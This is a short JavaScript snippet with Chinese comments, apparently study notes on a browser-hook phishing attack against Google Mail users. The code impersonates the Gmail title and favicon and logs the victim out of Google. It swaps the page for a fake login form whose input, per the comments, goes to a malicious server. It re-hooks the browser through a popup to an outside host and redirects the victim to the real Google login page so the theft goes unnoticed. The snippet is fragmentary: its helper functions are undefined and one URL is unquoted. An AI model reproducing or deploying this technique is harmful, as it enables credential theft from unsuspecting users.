//2019, 12/22, AM 7:00, Queenie


document.title = "Google Mail: Email is comming, plz rcv it";
q.browser.changeFavicon("https://mail.google.com/favicon.ico");
logoutGoogle();
displayPhishingSite();

// displayPhishingSite 此方法呼叫後，以假冒的內容重設了當前的 document.body 元素。
// 等待使用者輸入隱私資訊於此假冒的網頁後，資料也提交至惡意網站的伺服器。
// 並利用掛回 q website 的視窗，然後重新導向回 Google 登入頁面。
// 這時出現了同一頁登出後的假冒內容，像是提醒使用者自己輸入錯誤一樣。

window.open(http://browserhacker.com/rehook.html); 
window.focus();
window.location = "https://accounts.google.com/ServiceLoginAuth"; // 登出狀態